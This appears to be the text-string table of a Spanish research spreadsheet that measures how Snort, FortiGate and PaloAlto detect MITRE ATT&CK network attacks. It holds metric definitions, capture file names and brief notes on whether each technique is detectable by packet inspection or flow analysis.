    <t>Análisis de la capacidad de detección de ataques en red del IDS Snort bajo la matriz MITRE ATT&amp;CK mediante Caldera</t>
  </si>
  <si>
    <t>Javier Fructuoso Martín</t>
  </si>
  <si>
    <t>https://idus.us.es/handle/11441/143609</t>
  </si>
  <si>
    <t>Detección en fase temprana de ciberataques con rastro en red</t>
  </si>
  <si>
    <t>Andrés García Coronado</t>
  </si>
  <si>
    <t>https://biblus.us.es/bibing/proyectos/abreproy/94340/fichero/TFG-4340+GARC%C3%8DA+CORONADO%2C+ANDR%C3%89S.pdf</t>
  </si>
  <si>
    <t>Análisis de la capacidad de detección de ataques en red mediante los IDS Snort y FortiGate</t>
  </si>
  <si>
    <t>Javier García Borja</t>
  </si>
  <si>
    <t>Análisis de la capacidad de detección de ataques en red mediante los IDS Snort y PaloAlto</t>
  </si>
  <si>
    <t>Alejandro Moreno Pérez</t>
  </si>
  <si>
    <t>LEYENDA PROCEDENCIA DE PCAPS (Otros)</t>
  </si>
  <si>
    <t>Dataset-CIC-2018</t>
  </si>
  <si>
    <t>UNB - CIC</t>
  </si>
  <si>
    <t>https://www.unb.ca/cic/datasets/ids-2018.html</t>
  </si>
  <si>
    <t>(A.1) - REGLAS USADAS</t>
  </si>
  <si>
    <t>Tablas de IDS</t>
  </si>
  <si>
    <t>cada una de las tablas resume las versiones, fechas y características principales de los elementos que conforman las reglas de los IDS del estudio</t>
  </si>
  <si>
    <t>estas tablas especifican los valores de configuración de los IDS, como los umbrales de las alertas de Fuerza Bruta o Denegación de Servicio</t>
  </si>
  <si>
    <t>(B) - DETECCIONES ATAQUE</t>
  </si>
  <si>
    <t>Nº DE FLUJOS CON ATAQUE/S COLATERALES</t>
  </si>
  <si>
    <t>Nº Total de Alertas TP (Automático)</t>
  </si>
  <si>
    <t>Nº Total de Alertas (Manual)</t>
  </si>
  <si>
    <t>Attackids FP(Automático)</t>
  </si>
  <si>
    <t>Nº FLUJOS CON ATAQUE DETECTADOS POR FORTIGATE - TOTAL</t>
  </si>
  <si>
    <t>Nº FLUJOS CON ATAQUE DETECTADOS POR PALOALTO</t>
  </si>
  <si>
    <t>táctica a la que pertenece el ataque</t>
  </si>
  <si>
    <t>resto de tácticas a las que también pertenece el ataque</t>
  </si>
  <si>
    <t>ID de la táctica a la que pertenece el ataque</t>
  </si>
  <si>
    <t>técnica a la que pertenece el ataque</t>
  </si>
  <si>
    <t>ID de la técnica a la que pertenece el ataque</t>
  </si>
  <si>
    <t>subtécnica a la que pertenece el ataque (puede no tener subtécnica asociada)</t>
  </si>
  <si>
    <t>ID de la subtécnica a la que pertenece el ataque (puede no tener subtécnica asociada)</t>
  </si>
  <si>
    <t xml:space="preserve"> resumen breve del objetivo del ataque</t>
  </si>
  <si>
    <t xml:space="preserve"> herramienta/s empleadas para la implementación del ataque</t>
  </si>
  <si>
    <t>nombre del fichero PCAP que recoge los paquetes generados durante la implementación del ataque</t>
  </si>
  <si>
    <t>número total de flujos en el fichero pcap. Calculado haciendo uso de la herramienta tranalyzer, descartando aquellos flujos que no tienen una Cabecera asociada (descartando así la mayoría de flujos de capa &lt;L3)</t>
  </si>
  <si>
    <t xml:space="preserve"> número de flujos que contienen paquetes vinculados al ataque implementado</t>
  </si>
  <si>
    <t>número total de flujos que contienen ataques colaterales</t>
  </si>
  <si>
    <t>número de mensajes/paquetes que contienen al ataque implementado o parte de él.</t>
  </si>
  <si>
    <t>número total de instancias de ataque principales y colaterales. Una instancia es la unidad mínima de un ataque, pudiéndose tratar, por ejemplo, de un comando, una inyección SQL o un escaneo a un puerto concreto</t>
  </si>
  <si>
    <t>número de instancias de ataque en la captura de paquetes</t>
  </si>
  <si>
    <t>número de instancias en la captura de paquetes que constituyen amenaza y pueden generar alertas pero no están relacionadas con el propio ataque en sí.</t>
  </si>
  <si>
    <t>explicación del ataque colateral, de qué se trata y a qué técnica de la matriz MITRE pertenece</t>
  </si>
  <si>
    <t>SI o NO en función de si el ataque puede o podría ser detectado por patrones por un IDS</t>
  </si>
  <si>
    <t>define el mecanismo usado o que podría usarse para detectar satisfactoriamente el ataque</t>
  </si>
  <si>
    <t xml:space="preserve"> descripción más extensa del proceso de implementación del ataque. Opcional</t>
  </si>
  <si>
    <t>contiene una referencia donde poder consultar detalladamente el proceso de generación del pcap</t>
  </si>
  <si>
    <t>contiene una referencia donde poder consultar detalladamente la validación del pcap, analizando los paquetes y comprobando que el ataque verdaderamente se encuentra correctamente capturado</t>
  </si>
  <si>
    <t>contiene una referencia donde poder consultar detalladamente el análisis de detecciones del pcap para el IDS Snort</t>
  </si>
  <si>
    <t>✔ o ✘ en función de si la captura del ataque tiene formato .pcapng</t>
  </si>
  <si>
    <t>SI o NO (con matices) dependiendo de si el ataque es detectable por un IDS</t>
  </si>
  <si>
    <t>✔ o ✘ en función de si la captura de paquetes contiene ataques colaterales</t>
  </si>
  <si>
    <t xml:space="preserve"> ✔ o ✘ en función de si la captura de paquetes ha sufrido el ajuste de MTU para los entornos de los IDS</t>
  </si>
  <si>
    <t>✔ o ✘ en función de si la captura de paquetes ha devuelto errores en la reproducción de paquetes dentro de los entornos de los IDS</t>
  </si>
  <si>
    <t xml:space="preserve"> ✔ o ✘ en función de si la captura de paquetes tan sólo contiene flujos completos, es decir, no incluye flujos truncados</t>
  </si>
  <si>
    <t>LV1 o LV2 dependiendo de la categoría del ataque. Un ataque que puede interpretarse como una acción legítima en ciertos contextos pertenecerá a la categoría LV2. Si este caso hipotético no puede darse (el ataque siempre es ataque) será LV1</t>
  </si>
  <si>
    <t>explicación de por qué el ataque se categoriza como un ataque L1 o L2</t>
  </si>
  <si>
    <t>para cada RS de Snort, esta sección enumera los SIDs de las alertas devueltos por Snort para el RuleSet correspondiente</t>
  </si>
  <si>
    <t xml:space="preserve"> para cada RS de Snort, número de SIDs diferentes de las alertas devueltos por Snort para el RuleSet correspondiente</t>
  </si>
  <si>
    <t>para cada RS de Snort, número total de alertas (con repetición) generadas por Snort para el RuleSet correspondiente.</t>
  </si>
  <si>
    <t>para cada RS de Snort, SIDs que aparecen tanto en las detecciones de tráfico legítimo como en el propio ataque, equivalente a decir que los SIDs que aparecen en esta columna son los SIDs calificados como FP en el método de identificación de alertas automático</t>
  </si>
  <si>
    <t xml:space="preserve"> para cada RS de Snort, SIDs que sólo aparecen en las detecciones del ataque, equivalente a decir que los SIDs que aparecen en esta coluimna son todos los SIDs considerados como TP en el método de identificación de alertas automático</t>
  </si>
  <si>
    <t>para cada RS de Snort, nº de SIDs diferentes que han sido calificados como TP para el método automático de identificación de alertas</t>
  </si>
  <si>
    <t>para cada RS de Snort, nº total de alertas TP generadas, atendiendo al procedimiento automático de identificación de alertas</t>
  </si>
  <si>
    <t>para cada RS de Snort, SIDs que manualmente han sido calificados como FP, ya sea por tratarse de simples eventos de red o por no estar relacionados</t>
  </si>
  <si>
    <t>para cada RS de Snort, SIDs que aparecen en tráfico legítimo y que se usan para la metodología automática para calificar los SIDs del ataque como FP</t>
  </si>
  <si>
    <t>para cada RS de Snort, contendrá los SIDs de la columna "SIDs FP (Manual)" si esta no es igual a "-". En tal caso (no se ha realizado el análisis manual) contendrá los SIDs de la columna "SIDs FP (Automático)"</t>
  </si>
  <si>
    <t>para cada RS de Snort, contendrá los SIDs que han sido considerados de forma manual como Eventos de Red</t>
  </si>
  <si>
    <t xml:space="preserve"> para cada RS de Snort, SIDs que manualmente se ha comprobado que siempre son TP</t>
  </si>
  <si>
    <t>para cada RS de Snort, SIDs que manualmente se ha comprobado que en ocasiones son TP y en otras FP</t>
  </si>
  <si>
    <t>para cada RS de Snort, nº de SIDs diferentes que han sido calificados como TP para el método manual de identificación de alertas</t>
  </si>
  <si>
    <t>para cada RS de Snort, nº total de alertas TP generadas, atendiendo al procedimiento manual de identificación de alertas</t>
  </si>
  <si>
    <t>para el RS1 y RS3, número de flujos totales analizados por Snortv3</t>
  </si>
  <si>
    <t>para cada RS de Snort, número de flujos con ataque detectados por el RuleSet. Para este cálculo, se cuenta el número de flujos totales dentro de los logs de alertas</t>
  </si>
  <si>
    <t xml:space="preserve"> para cada RS de Snort, número de mensajes de red con ataque detectados por el RuleSet. Para este cálculo, se cuenta el número total de paquetes diferentes dentro de los logs de alertas</t>
  </si>
  <si>
    <t>para el RS1 de Snort, número de instancias de ataque totales detectadas. Para este cálculo, se cuenta el número total de alertas dentro de los logs de alertas.</t>
  </si>
  <si>
    <t>para cada RS de Snort, número de mensajes de red con ataques manualmente calificados como TP detectados por el RuleSet</t>
  </si>
  <si>
    <t>para cada RS de Snort, número de instancias de ataques calificadas manualmente como TP totales detectadas</t>
  </si>
  <si>
    <t xml:space="preserve"> para cada RS de Snort, número de flujos con ataques automáticamente calificados como TP detectados por el RuleSet. Para el cálculo, se discriminan todas aquellas alertas cuyo SID se encuentre también en los SIDs de tráfico legítimo</t>
  </si>
  <si>
    <t>para cada RS de Snort, número de mensajes con ataques automáticamente calificados como TP detectados por el RuleSet. Para el cálculo, se discriminan todas aquellas alertas cuyo SID se encuentre también en los SIDs de tráfico legítimo</t>
  </si>
  <si>
    <t>para el RS1 de Snort, número de instancias de ataques automáticamente calificadas como TP detectadas por el RuleSet. Para el cálculo, se discriminan todas aquellas alertas cuyo SID se encuentre también en los SIDs de tráfico legítimo</t>
  </si>
  <si>
    <t>para cada RS, número de flujos con ataques detectados entre número de flujos con ataques de la captura</t>
  </si>
  <si>
    <t>para cada RS, número de flujos con ataques TP filtrados automáticamente detectados entre número de flujos con ataques de la captura</t>
  </si>
  <si>
    <t>para cada RS, número de flujos con ataques TP filtrados manualmente detectados entre número de flujos con ataques de la captura</t>
  </si>
  <si>
    <t>para cada RS, número de mensajes con ataques detectados entre número de mensajes con ataques de la captura</t>
  </si>
  <si>
    <t>para cada RS, número de mensajes con ataques TP filtrados automáticamente detectados entre número de mensajes con ataques de la captura</t>
  </si>
  <si>
    <t>para cada RS, número de mensajes con ataques TP filtrados manualmente detectados entre número de mensajes con ataques de la captura</t>
  </si>
  <si>
    <t>para el RS1, número de instancias de ataques detectadas entre número de instancias de ataques de la captura</t>
  </si>
  <si>
    <t>para el RS1, número de instancias de ataques TP filtrados automáticamente detectas entre número de instancias de ataques de la captura</t>
  </si>
  <si>
    <t>para los RS2, RS3 y RS4, número de instancias de ataques detectadas calculadas manualmente entre número de instancias de ataques en la captura</t>
  </si>
  <si>
    <t>para cada RS2 y RS4 de Snort, número de flujos totales analizados por Snortv2</t>
  </si>
  <si>
    <t>para los RS2, RS3 y RS4 número de instancias de ataque totales detectadas por el paquete de reglas de Talos respectivo</t>
  </si>
  <si>
    <t>para los RS2, RS3 y RS4 número de instancias de ataque totales detectadas por el paquete de reglas de ETOpen respectivo</t>
  </si>
  <si>
    <t>para los RS2, RS3 y RS4, número de instancias de ataques automáticamente calificadas como TP detectadas por el paquete de reglas Talos respectivo. Para el cálculo, se discriminan todas aquellas alertas cuyo SID se encuentre también en los SIDs de tráfico legítimo</t>
  </si>
  <si>
    <t xml:space="preserve"> para los RS2, RS3 y RS4, número de instancias de ataques automáticamente calificadas como TP detectadas por el paquete de reglas ETOpen respectivo. Para el cálculo, se discriminan todas aquellas alertas cuyo SID se encuentre también en los SIDs de tráfico legítimo</t>
  </si>
  <si>
    <t>para los RS2, RS3 y RS4, número de instancias de ataques automáticamente calificadas como TP detectadas en total. Para el cálculo, se discriminan todas aquellas alertas cuyo SID se encuentre también en los SIDs de tráfico legítimo así como se realiza una puesta en conjunto manual para asociar las alertas de cada paquete de reglas a una instancia.</t>
  </si>
  <si>
    <t>para los RS2, RS3 y RS4, número de instancias de ataques TP filtrados automáticamente y calculados manualmente entre número de instancias de ataques de la captura</t>
  </si>
  <si>
    <t>para cada RS, número de instancias de ataques TP filtrados manualmente detectadas entre número de instancias de ataques de la captura</t>
  </si>
  <si>
    <t>para cada RS, porcentaje de detección eficaz de flujos. Esto es el número de flujos detectados, ya sean principales o colaterales</t>
  </si>
  <si>
    <t>para cada RS, porcentaje de detección del ataque. Esta celda valdrá 100% si el ataque contiene al menos una alerta válida (TP o colateral) o 0% en caso contrario</t>
  </si>
  <si>
    <t xml:space="preserve"> para cada ataque, esta columna indica si se ha podido realizar el análisis manual basado en flujos, mensajes e instancias. Debido a la existencia de pcaps de gran tamaño y que por consiguiente pueden generar un gran número de alertas, su manejo y clasificación puede resultar inabordable, por lo que se deja indicado en esta columna. Aquellos ataques con una ✘ en esta celda no serán contemplados para los registros manuales (además disponen de "-" en los apartados manuales)</t>
  </si>
  <si>
    <t>es posible que en determinados casos resulte necesario añadir comentarios acerca de un ataque en particular. En esta columna podrá encontrar dichos comentarios para el caso de Snort.</t>
  </si>
  <si>
    <t xml:space="preserve"> para FortiGate, muestra la lista de los attackids devueltos por la detección de FortiGate para un ataque concreto</t>
  </si>
  <si>
    <t>para FortiGate, número de attackids diferentes</t>
  </si>
  <si>
    <t>para Fortigate, número total de alertas (con repetición) generadas por Fortigate.</t>
  </si>
  <si>
    <t>para FortiGate, attackids que aparecen tanto en la captura del ataque como en el dataset legitimo XX</t>
  </si>
  <si>
    <t>para FortiGate, número de attackids que aparecen tanto en la captura del ataque como en el dataset legitimo XX</t>
  </si>
  <si>
    <t>attackids que han sido considerados como FP de forma manual</t>
  </si>
  <si>
    <t>attackids que han sido considerados como FP de forma automática, es decir, en base a los attackids que han aparecido también en el tráfico legítimo</t>
  </si>
  <si>
    <t>attackids que han sido considerados como TP de forma manual</t>
  </si>
  <si>
    <t>attackids que han sido considerados como TP de forma automática, es decir, aquellos que no han aparecido en las detecciones del tráfico legítimo.</t>
  </si>
  <si>
    <t>para FortiGate, Attackids considerados como FP totales. Para esta columna se usará siempre que se haya podido efectuar el análisis manual los attackids que aparezcan en la columna "Attackids FP (Manual)". En su defecto se usarán los valores del análisis automático.</t>
  </si>
  <si>
    <t xml:space="preserve"> número de attackids FP que han acabado identificándose.</t>
  </si>
  <si>
    <t>appids de las alertas de control de aplicaciones que saltan para el ataque estudiado</t>
  </si>
  <si>
    <t>es posible que en determinados casos resulte necesario añadir comentarios acerca de un ataque en particular. En esta columna podrá encontrar dichos comentarios para el caso de FortiGate</t>
  </si>
  <si>
    <t>SI o NO dependiendo de si el ataque se encuentra en el rango de acción del IDS. Por lo general, se aplica SI a ataques L3 y NO a ataques L2</t>
  </si>
  <si>
    <t>número de sessionids diferentes que aparecen en el log generado para un ataque. Este parámetro sirve para identificar el número total de flujos detectados por FortiGate.</t>
  </si>
  <si>
    <t xml:space="preserve">número total de flujos ya sea de ataques o considerados por el motor de aplicaciones y que identifican correctamente el ataque </t>
  </si>
  <si>
    <t>número de flujos con ataque (sessionids) detectados por los motores de ataque de FortiGate</t>
  </si>
  <si>
    <t>número de flujos con ataque (sessionids) detectados por los motores de aplicación de FortiGate (y que identifican el ataque correctamente)</t>
  </si>
  <si>
    <t>número de flujos (ya sean principales o colaterales) para los que se ha generado una alerta TP válida</t>
  </si>
  <si>
    <t>número de flujos con ataque detectados por FortiGate entre número de flujos con ataque en la captura</t>
  </si>
  <si>
    <t>porcentaje de detección eficaz de flujos. Se calcula dividiendo el número de flujos con ataque eficazmente detectados entre el número total de flujos con ataque (principales + colaterales)</t>
  </si>
  <si>
    <t>porcentaje de detección eficaz de ataque. Valdrá 100% si hay al menos un flujo de ataque detectado eficazmente. Valdrá 0% en caso contrario</t>
  </si>
  <si>
    <t>para PaloAlto, muestra la lista de los threat_ids devueltos por la detección de PaloAlto para un ataque concreto</t>
  </si>
  <si>
    <t>para PaloAlto, número de threat_ids diferentes</t>
  </si>
  <si>
    <t>para PaloAlto, número total de alertas (con repetición) generadas por Fortigate.</t>
  </si>
  <si>
    <t>para PaloAlto, threat_ids que aparecen tanto en la captura del ataque como en el dataset legitimo XX</t>
  </si>
  <si>
    <t>para PaloAlto, número de threat_ids que aparecen tanto en la captura del ataque como en el dataset legitimo XX</t>
  </si>
  <si>
    <t>threat_ids que han sido considerados como TP de forma manual</t>
  </si>
  <si>
    <t xml:space="preserve"> threat_ids que han sido considerados como FP de forma manual</t>
  </si>
  <si>
    <t>para PaloAlto, threat_ids considerados como FP totales. Para esta columna se usará siempre que se haya podido efectuar el análisis manual los threat_ids que aparezcan en la columna "threat_ids FP (Manual)". En su defecto se usarán los valores del análisis automático.</t>
  </si>
  <si>
    <t>número de threat_ids FP que han acabado identificándose.</t>
  </si>
  <si>
    <t xml:space="preserve"> es posible que en determinados casos resulte necesario añadir comentarios acerca de un ataque en particular. En esta columna podrá encontrar dichos comentarios para el caso de PaloAlto</t>
  </si>
  <si>
    <t>número de sessionids diferentes que aparecen en el log generado para un ataque. Este parámetro sirve para identificar el número total de flujos detectados por PaloAlto.</t>
  </si>
  <si>
    <t>número de sessionids diferentes que tienen asociado un threat_id en el log generado por PaloAlto.</t>
  </si>
  <si>
    <t>número de flujos con ataque detectados por PaloAlto entre número de flujos con ataque en la captura</t>
  </si>
  <si>
    <t>✔ o ✘ en función de si los resultados obtenidos para un ataque acaban siendo usados para elaborar los análisis finales o no. Esta decisión se basa en parámetros como la detectabilidad, si es detectable por patrones y si se ha producido algún error en la reproducción de paquetes</t>
  </si>
  <si>
    <t>↓</t>
  </si>
  <si>
    <t>La suma de los SIDs en estas dos columnas constituye el total de SIDs que han sido calificados como TP en el método de identificación de alertas manual. Cabe recalcar que la segunda columna se encuentra vacía en este estudio, pero podría ser de utilidad en algún ataque futuro</t>
  </si>
  <si>
    <t>(C) - DETECCIONES TRÁFICO LEGÍTIMO</t>
  </si>
  <si>
    <t>SIDs en Tráfico legítimo (RS1, RS2, RS3, RS4, FortiGate, PaloAlto)</t>
  </si>
  <si>
    <t>#SIDs en Tráfico legítimo (RS1, RS2, RS3, RS4, FortiGate, PaloAlto)</t>
  </si>
  <si>
    <t>Nombre del fichero pcap correspondiente a la captura de tráfico legítimo</t>
  </si>
  <si>
    <t>Clasifica la captura de tráfico (por lo general será REAL)</t>
  </si>
  <si>
    <t>Dataset al que pertenece la captura de paquetes</t>
  </si>
  <si>
    <t>Tamaño del fichero PCAP</t>
  </si>
  <si>
    <t>Número de flujos totales calculados con la herramienta tranalyzer del fichero PCAP</t>
  </si>
  <si>
    <t>Nº de direcciones IP distintas que aparecen en la captura de paquetes</t>
  </si>
  <si>
    <t>SIDs que ha generado el IDS correspondiente (para el RuleSet correspondiente en caso de Snort) para la detección del fichero PCAP</t>
  </si>
  <si>
    <t>Nº SIDs que ha generado el IDS correspondiente (para el RuleSet correspondiente en caso de Snort) para la detección del fichero PCAP</t>
  </si>
  <si>
    <t>Indica si dentro de la captura hay al menos un flujo incompleto, por la falta del SYN inicial</t>
  </si>
  <si>
    <t>(D) - ANÁLISIS RESULTADOS I - SNORT</t>
  </si>
  <si>
    <t>Registros Totales - Porcentajes Promedio</t>
  </si>
  <si>
    <t>Registros Particulares - Valores Absolutos (Táctica / Técnica)</t>
  </si>
  <si>
    <t>Registros Particulares - Porcentajes Totales (Táctica / Técnica)</t>
  </si>
  <si>
    <t>Registros Particulares - Porcentajes Promedio (Táctica / Técnica)</t>
  </si>
  <si>
    <t>Alertas Totales (SIDs)</t>
  </si>
  <si>
    <t>TP Totales (SIDs)</t>
  </si>
  <si>
    <t>Este registro concierne al número exclusivo de reglas (reglas que no aparecen en ningún otro paquete de reglas) de cada uno de los paquetes que intervienen en el estudio. Contiene un gráfico de cascada.</t>
  </si>
  <si>
    <t>Este registro almacena sumas y cálculos totales, sin hacer uso de porcentajes, para todos los datos del estudio (sin atender a categorías del estilo táctica o técnica)</t>
  </si>
  <si>
    <t>Este registro almacena porcentajes relativos a los valores absolutos de todos los datos del estudio (sin atender a categorías del estilo táctica o técnica)</t>
  </si>
  <si>
    <t>Este registro almacena porcentajes obtenidos a partir de promedios calculados directamente de los valores de la pestaña (B) - Detecciones - Ataques. Los promedios se realizan sobre todos los datos del estudio (sin atender a categorías del estilo táctica o técnica)</t>
  </si>
  <si>
    <t>Este registro almacena sumas y cálculos totales, sin hacer uso de porcentajes, para todos los datos del estudio, clasificándolos por táctica o técnica según corresponda</t>
  </si>
  <si>
    <t>Este registro almacena porcentajes relativos a los valores absolutos de todos los datos del estudio, clasificándolos por táctica o técnica según corresponda</t>
  </si>
  <si>
    <t>Este registro almacena porcentajes obtenidos a partir de promedios calculados directamente de los valores de la pestaña (B) - Detecciones - Ataques. Los promedios se realizan sobre todos los datos del estudio, clasificándolos por táctica o técnica según corresponda</t>
  </si>
  <si>
    <t>Este registro recoge para cada RuleSet y Táctica el número de técnicas que han generado al menos un TP</t>
  </si>
  <si>
    <t>Este registro recoge para cada RuleSet y Táctica el número de ataques que han generado al menos un TP</t>
  </si>
  <si>
    <t>Este registro recoge para cada RuleSet y táctica el número de SIDs diferentes generados para cada ataque (sumados en caso de existir más de un ataque por combinación)</t>
  </si>
  <si>
    <t>Este registro recoge para cada RuleSet y táctica el número de SIDs calificados como TP</t>
  </si>
  <si>
    <t>(D) - ANÁLISIS RESULTADOS II - FORTIGATE</t>
  </si>
  <si>
    <t>esta tabla muestra el número de alertas totales que son consideradas como TP para cada táctica</t>
  </si>
  <si>
    <t>esta tabla muestra el número de alertas promedio que son consideradas como TP y que se generan para cada ataque dentro de una táctica</t>
  </si>
  <si>
    <t>esta tabla muestra el porcentaje de efectividad que presentan las alertas generadas para cada táctica, calculadas dividiendo el número de TPs entre el número de alertas totales</t>
  </si>
  <si>
    <t>(D) - ANÁLISIS RESULTADOS III - PALOALTO</t>
  </si>
  <si>
    <t>(D) - ANÁLISIS RESULTADOS IV - CONJUNTO</t>
  </si>
  <si>
    <t>Comparación Snort vs FG</t>
  </si>
  <si>
    <t>Comparación Snort vs PA</t>
  </si>
  <si>
    <t>esta tabla muestra diferentes contadores y gráficas acerca de las categorías que intervienen en el estudio</t>
  </si>
  <si>
    <t>este registro compara en diferentes secciones los resultados obtenidos a nivel de flujos por Snort y FG, para totales, tácticas y técnicas</t>
  </si>
  <si>
    <t>este registro compara en diferentes secciones los resultados obtenidos a nivel de flujos por Snort y PA, para totales, tácticas y técnicas</t>
  </si>
  <si>
    <t>(E) - REFERENCIAS</t>
  </si>
  <si>
    <t>Tabla de Referencias</t>
  </si>
  <si>
    <t>esta tabla resume las diferentes fuentes de los datos que intervienen en el estudio</t>
  </si>
  <si>
    <t>137 = 20 (L2) + 117 (L3)</t>
  </si>
  <si>
    <t>T1499.002-Slowloris-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>T1499.002-Slowhttptest-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>T1499.003-GoldenEye-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>T1499.003-Hulk-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>T1203-Botnet_C2018_[6].pcapng</t>
  </si>
  <si>
    <t>* "SI": existen reglas (patrones) en los rulesets (de Snort, FG, PA) capaces de detectar el ataque, ya se basen esas reglas en analizar datos del paquete (detección DPI) o en el comportamiento del flujo (detección por flujos).
* "SI*": ="SI" (con alguna apreciación), pero va acompañado (en la columna "MECANISMO DE DETECCIÓN") de una descripción particular que conviene considerar para interpretar mejor la detección. Ejemplo: "La detección de la creación del canal es posible para este caso concreto, en el que el cortafuegos detecta la creación de ambos canales. Sin embargo, si ambos canales, tanto primario como secundario están establecidos, y no se ha detectado su creación, el cambio de uno a otro es inapreciable por el IDS.".
* "NO": No es posible detectarlo por reglas.
* "NO*" (= Salvo ajuste de reglas): si puede detectarse por reglas como antes, pero no basta con las predeterminadas, requiriendo ajustes (tal vez, un "SI**" sería más intuitivo).
* "NO**" (=Salvo casos particulares): No puede detectarse por reglas, salvo algún caso particular del ataque.
* "NO***" (Ambos): "NO*" + "NO**".</t>
  </si>
  <si>
    <t>DPI</t>
  </si>
  <si>
    <t>Ambos</t>
  </si>
  <si>
    <t>Puede configurarse detección específica, pero no con reglas genéricas; requiere sensores o reglas adicionales (e.g. obexftp, btobex).</t>
  </si>
  <si>
    <t>Flujos</t>
  </si>
  <si>
    <t>Los patrones de eventos programados pueden deducirse del flujo, pero confirmar contenido exfiltrado exige DPI.</t>
  </si>
  <si>
    <t>Solo con reglas específicas configuradas para detectar transferencia de fragmentos secuenciales por FTP u otros medios. Dependiendo de la forma en la que se envien los archivos, puede ser indetectable. Sin embargo, si utiliza protocolos de transferencia de ficheros (FTP,SMB...) resulta importante monitorizar transferencias con un mismo tamaño de manera concurrente</t>
  </si>
  <si>
    <t>Para detectar autenticaciones falsas se requiere observar el contenido de protocolos vulnerables (WEP).</t>
  </si>
  <si>
    <t>Los patrones de escaneo por herramientas como LOIC son claros en los flujos.</t>
  </si>
  <si>
    <t>nmap genera firmas de escaneo reconocibles mediante flujos por volumen y secuencia de puertos.</t>
  </si>
  <si>
    <t>Flujos permiten ver conexiones en puertos de VNC; DPI permite inspeccionar contenido para detectar autenticaciones y comandos.</t>
  </si>
  <si>
    <t>Cualquiera</t>
  </si>
  <si>
    <t>Flujos identifican uso de puertos típicos de WinRM; DPI permite inspeccionar contenido de comandos.</t>
  </si>
  <si>
    <t>Aunque hay reglas para detectar ICMP inusual, muchas veces el canal puede camuflarse fácilmente. Podría considerarse SI* o incluso NO* si la técnica es sofisticada.</t>
  </si>
  <si>
    <t>Flujos identifican accesos a servicios cloud no autorizados; DPI puede detectar transferencias o comandos maliciosos.</t>
  </si>
  <si>
    <t>Flujos detectan puertos usados por ARD; DPI permite inspección de contenido para detectar patrones.</t>
  </si>
  <si>
    <t>Flujos detectan uso del puerto 22; DPI puede detectar autenticaciones o actividad en la sesión SSH.</t>
  </si>
  <si>
    <t>Flujos detectan conexiones en el puerto 23; DPI permite ver comandos enviados por Telnet.</t>
  </si>
  <si>
    <t>Flujos detectan transferencia de archivos inusuales; DPI permite identificar protocolos como FTP/SCP.</t>
  </si>
  <si>
    <t>RPC requiere inspección profunda del contenido del paquete debido a puertos dinámicos y complejidad del protocolo.</t>
  </si>
  <si>
    <t>Flujos detectan conexiones persistentes a C2; DPI detecta firmas o comandos específicos de RATs.</t>
  </si>
  <si>
    <t>No detectable con firmas básicas, pero puede haber detección con reglas específicas si se identifican patrones de uso de API de Drive o acceso persistente inusual. Requiere reglas específicas no estándar para APIs.</t>
  </si>
  <si>
    <t>Flujos identifican uso de puertos como 443 con RD Gateway; DPI permite inspección de tráfico para detectar comandos.</t>
  </si>
  <si>
    <t>Si se usa Covenant sobre RDP, hay posibilidades de detección si se inspecciona tráfico al canal o se monitoriza el RDP como vector. Detectable en ciertos contextos con inspección de protocolo RDP o tráfico HTTP posterior (Covenant).</t>
  </si>
  <si>
    <t>Flujos detectan uso de puertos típicos de gestión; DPI permite analizar comandos o actividades sospechosas.</t>
  </si>
  <si>
    <t>Flujos detectan patrones de acceso remoto; DPI inspecciona comandos transmitidos por la shell remota.</t>
  </si>
  <si>
    <t>Ataques sobre redes Wi-Fi (offline cracking) no dejan huella en la red en tiempo real. Solo si capturas el handshake y lo analizas.</t>
  </si>
  <si>
    <t>Flujos detectan conexiones a servidores conocidos; DPI puede encontrar firmas del software.</t>
  </si>
  <si>
    <t>PMKID se captura pasivamente, sin generar tráfico activo anómalo. No detectable por reglas tradicionales.</t>
  </si>
  <si>
    <t>Flujos detectan puertos de RDP/VNC; DPI analiza autenticaciones y contenido de las sesiones.</t>
  </si>
  <si>
    <t>Explotan debilidades en WEP, con tráfico cifrado. Se requiere captura especializada; no visible por IDS.</t>
  </si>
  <si>
    <t>Flujos identifican patrones de acceso remotos; DPI puede inspeccionar comandos y firmas.</t>
  </si>
  <si>
    <t>Reaver y similares explotan WPS vía 802.11 — requiere visibilidad física y no genera patrones firmables por Snort.</t>
  </si>
  <si>
    <t>Flujos detectan conexiones a servidores de gestión; DPI analiza tráfico para detectar patrones maliciosos.</t>
  </si>
  <si>
    <t>Flujos identifican tráfico a herramientas RMM; DPI puede detectar firmas y comandos.</t>
  </si>
  <si>
    <t>Flujos detectan puertos y patrones de acceso; DPI puede inspeccionar comandos o actividades sospechosas.</t>
  </si>
  <si>
    <t>Flujos observan conexiones remotas; DPI detecta comandos transmitidos.</t>
  </si>
  <si>
    <t>Flujos identifican puertos de gestión; DPI analiza sesiones en busca de comportamientos anómalos.</t>
  </si>
  <si>
    <t>Puede detectarse por flujos (extracción inusual de datos de correo) o por paquetes (contenido específico HTTP con cabeceras/email).</t>
  </si>
  <si>
    <t>Codificación base64 puede generar patrones detectables en flujos (volumen, frecuencia) o por inspección del contenido HTTP.</t>
  </si>
  <si>
    <t>El establecimiento de túneles VPN puede detectarse por análisis de flujo (puertos, duración, frecuencia), pero no por contenido DPI.</t>
  </si>
  <si>
    <t>Tráfico SMB anómalo (puertos 445/139) puede detectarse por flujo; también posible detectar cabeceras SMB/NTLM con DPI.</t>
  </si>
  <si>
    <t>Explotación de navegador requiere inspección de contenido HTML para detectar código embebido malicioso.</t>
  </si>
  <si>
    <t xml:space="preserve"> Descarga de ejecutable sólo es detectable con inspección del contenido HTTP (cabeceras, nombre del archivo).</t>
  </si>
  <si>
    <t>Inyección SQL requiere examinar contenido del paquete (URL, payload HTTP) para detectar patrones maliciosos.</t>
  </si>
  <si>
    <t>Uso de Sqlmap automatiza payloads que solo DPI puede identificar en la capa de aplicación.</t>
  </si>
  <si>
    <t>Inyección SQL en URL solo es detectable inspeccionando el contenido del paquete HTTP (parámetros y payloads).</t>
  </si>
  <si>
    <t xml:space="preserve"> Ataques con Sqlmap requieren inspección profunda del contenido para identificar comandos SQL.</t>
  </si>
  <si>
    <t>Detectable al inspeccionar el contenido de los paquetes buscando cadenas como "BITS" o nombres de ejecutables.</t>
  </si>
  <si>
    <t>Aunque hay patrones de flujo, detectar RDP malicioso específico (como secuencias de control) requiere inspección de paquetes.</t>
  </si>
  <si>
